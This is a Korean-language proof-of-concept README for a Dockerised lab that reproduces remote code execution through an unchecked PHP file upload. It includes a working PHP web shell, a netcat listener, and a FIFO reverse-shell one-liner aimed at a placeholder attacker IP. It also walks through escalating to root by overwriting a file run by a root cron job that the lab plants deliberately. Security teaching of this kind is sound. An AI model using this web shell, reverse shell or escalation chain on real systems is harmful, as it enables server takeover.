# 1. RCE via File Upload 취약점 이란?

파일 업로드 취약점은 서버가 업로드된 파일에 대해 적절한 검증을 수행하지 않아, 공격자가 임의의 코드를 포함한 파일을 업로드하고 실행할 수 있게 되는 보안 이슈입니다.

- 시스템 명령어 실행 (Remote Command Execution, RCE)
- 서버 권한 상승 등 추가 공격
- Reverse Shell

# 2. PoC 목적 및 개요

본 PoC는 파일 업로드 취약점을 이용해 RCE를 재현합니다.

공격자는 악성 PHP 웹쉘을 업로드하고 이를 실행함으로써 서버 내에서 임의의 시스템 명령을 원격으로 실행할 수 있음을 실습 환경에서 확인할 수 있습니다.

# 3. 환경 구성

- 언어 및 환경 : PHP 8.2 (내장 웹서버 사용)
- 구성 파일
    - `upload.php`: 파일 업로드
    - `Dockerfile`: PHP + cron + supervisor 설치 도커 이미지 빌드 설정
- Docker 환경
    - 컨테이너 실행 시 PHP 웹서버가 `0.0.0.0:8080`에서 실행
    - 업로드된 파일은 `uploads/` 디렉토리에 원본 파일명으로 저장

# 4. 실행 방법

1. Docker 이미지 가져오기
    
    ```bash
    $ docker pull dukbong/poc:2025-06-fileupload
    
    ```
    
2. Docker 컨테이너 실행
    
    ```bash
    docker run --name fileupload -p 8080:8080 dukbong/poc:2025-06-fileupload
    
    ```
    
3. Docker 컨테이너 내부 설정
    - root 권한으로 접속
    
    ```bash
    docker exec -it --user root fileupload /bin/bash
    ```
    
    - root 권한으로 cron 작성
    
    ```bash
    vi /etc/cron.d/fileupload
    
    # 해당 스케줄러 실행 시 root 권한으로 실행됩니다. ( 권한 상승 지점 )
    * * * * * root /tmp/fileupload
    ```
    
    - 권한 설정
    
    ```bash
    chmod 744 /etc/cron.d/fileupload
    ```
    
4. 웹 애플리케이션 접속
    
    ```bash
    http://localhost:8080
    ```
    
5. 주요 엔드포인트
    
    
    | 경로 | 설명 | 메소드 | 비고 |
    | --- | --- | --- | --- |
    | / | 파일 업로드 페이지 | GET, POST | 취약점 시연 대상 |
    | /uploads/{file_name} | 파일 경로 | GET |  |
6. 예시 Web Shell 코드
    
    ```php
    <?php
    if (isset($_POST['cmd'])) {
        echo "<pre>";
        system($_POST['cmd']);
        echo "</pre>";
    }
    ?>
    
    <form method="POST">
        <input type="text" name="cmd" placeholder="명령어 입력" style="width: 300px;">
        <button type="submit">실행</button>
    </form>
    ```
    

# 5. 재현 절차

1. 웹 페이지 접속 후 임의의 PHP web shell 파일 (예: `shell.php`) 업로드 합니다.
2. 업로드 성공 후 `/uploads/shell.php` 로 접근합니다.
3. 입력창에 `id`명령어 작성 후 결과가 출력 되는 걸 확인합니다.
    1. `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
4. `/etc/cron.d` 폴더 안에 있는 `fileupload` 파일을 확인합니다.
    1. `cat /etc/cron.d/fileupload`
5. 공격자 PC에서 `ifconfig`를 통해 IP를 확인합니다.
6. 공격자 PC에서 `nc -nlvp 9999`로 9999 포트를 리스닝 합니다.
7. `Reverse Shell Cheat Sheet`를 활용하여 스크립트를 만듭니다.
    1. 참고 사이트 : https://www.revshells.com/
    2. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 공격자IP 9999 >/tmp/f`
8. 아래 악성 스크립를 통해 스케줄러에서 실행되는 파일을 수정합니다.
`printf 'cheat sheet \n' > /tmp/fileupload && chmod +x /tmp/fileupload` 
    1. 마지막 빈줄 삽입이 없는 경우 명령어가 무시되는 경우가 발생합니다.
9. 1분 후 공격자 PC에서 `id` 명령어를 통해 root 계정을 사용하는 것을 확인합니다.
    

# 6. 참고 사항 (VirtualBox 환경)

- Kali Linux가 VirtualBox에 설치되어 있는 경우
    - 설정 → 네트워크 → 어댑터1 → '브리지 어댑터' 설정
    - 인터페이스 이름은 실제 사용하는 네트워크(Wi-Fi/LAN 등)로 지정
    - 설정 후 재시작 필요합니다.
- 동일 물리 네트워크 상의 다른 장비 사용 시 별도 설정 불필요합니다.
